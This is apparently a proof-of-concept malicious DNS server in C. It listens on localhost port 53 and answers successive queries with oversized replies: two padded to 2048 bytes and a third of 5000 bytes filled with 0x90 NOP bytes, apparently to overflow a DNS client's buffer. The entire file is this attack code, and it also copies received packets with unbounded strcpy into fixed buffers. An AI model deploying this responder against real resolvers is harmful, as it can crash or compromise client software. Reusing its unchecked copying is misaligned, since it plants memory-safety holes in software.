#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h> /* for socket(), bind() */
#include <string.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h> /* for atoi() and exit() */
#include <arpa/inet.h> /* for sockaddr_in and inet_ntoa() */
#include <ctype.h>
#include <time.h> /* for ctime()*/

#define MAXBUFFSIZE 10240

int main(int argc, char* argv[])
{
	int sockfd = socket(PF_INET, SOCK_DGRAM, 0);
	struct sockaddr_in servAddr, cliAddr;
	int servLen = sizeof(servAddr); 

	servAddr.sin_family = AF_INET; 
	servAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servAddr.sin_port = htons(53);
	char sendbuf[MAXBUFFSIZE] = {0};
	bind(sockfd, (struct sockaddr*)&servAddr, sizeof(servAddr));

	while (1)
	{
		char buf[1024] = {0};
       
		recvfrom(sockfd, buf, 1024, 0, (struct sockaddr*)&cliAddr, (socklen_t*)&servLen);
			
		char query_udp[256] = {0};
		strcpy(query_udp, buf + 12);
		printf("%s\n", query_udp);

		bzero(sendbuf, MAXBUFFSIZE);
		sendbuf[0] = buf[0];
		sendbuf[1] = buf[1];
		sendbuf[2] = 0x81;
		sendbuf[3] = 0x80;
		sendbuf[4] = 0x00;
		sendbuf[5] = 0x01;

		sendbuf[6] = 0x00;
		sendbuf[7] = 0x00;

		sendbuf[8] = 0x00;
		sendbuf[9] = 0x00;

		sendbuf[10] = 0x00;
		sendbuf[11] = 0x00;
		
		strcpy(sendbuf + 12, query_udp);
		int i = 12 + strlen(query_udp);
		printf("i is %d\n", i);
		for (; i < 2048; ++i)
		{
			sendbuf[i] = 0x02;
		}
		printf("sendbuf is %d\n", strlen(sendbuf));
        sendto(sockfd, sendbuf, 2048, 0, (struct sockaddr*)&cliAddr, (socklen_t)servLen);

        bzero(buf, 1024);
		recvfrom(sockfd, buf, 1024, 0, (struct sockaddr*)&cliAddr, (socklen_t*)&servLen);
		bzero(query_udp, 256);
		strcpy(query_udp, buf + 12);
		printf("%s\n", query_udp);

		bzero(sendbuf, MAXBUFFSIZE);
		sendbuf[0] = buf[0];
		sendbuf[1] = buf[1];
		sendbuf[2] = 0x81;
		sendbuf[3] = 0x80;
		sendbuf[4] = 0x00;
		sendbuf[5] = 0x01;

		sendbuf[6] = 0x00;
		sendbuf[7] = 0x00;

		sendbuf[8] = 0x00;
		sendbuf[9] = 0x00;

		sendbuf[10] = 0x00;
		sendbuf[11] = 0x00;
		
		strcpy(sendbuf + 12, query_udp);
		i = 12 + strlen(query_udp);
		printf("i is %d\n", i);
		for (; i < 2048; ++i)
		{
			sendbuf[i] = 0x02;
		}
        sendto(sockfd, sendbuf, 2048, 0, (struct sockaddr*)&cliAddr, (socklen_t)servLen);
	
		bzero(buf, 1024);
		recvfrom(sockfd, buf, 1024, 0, (struct sockaddr*)&cliAddr, (socklen_t*)&servLen);
		bzero(query_udp, 256);
		strcpy(query_udp, buf + 12);
		printf("%s\t%d\n", query_udp, strlen(query_udp));
		bzero(sendbuf, MAXBUFFSIZE);
		sendbuf[0] = buf[0];
		sendbuf[1] = buf[1];
		sendbuf[2] = 0x81;
		sendbuf[3] = 0x80;
		sendbuf[4] = 0x00;
		sendbuf[5] = 0x01;

		sendbuf[6] = 0x00;
		sendbuf[7] = 0x00;

		sendbuf[8] = 0x00;
		sendbuf[9] = 0x00;

		sendbuf[10] = 0x00;
		sendbuf[11] = 0x00;
		
		strcpy(sendbuf + 12, query_udp);
		i = 12 + strlen(query_udp);
		printf("i is %d\n", i);
		for (; i < 5000; ++i)
		{
			sendbuf[i] = 0x90;
		}
        sendto(sockfd, sendbuf, 5000, 0, (struct sockaddr*)&cliAddr, (socklen_t)servLen);		
	}
	return 0;
}
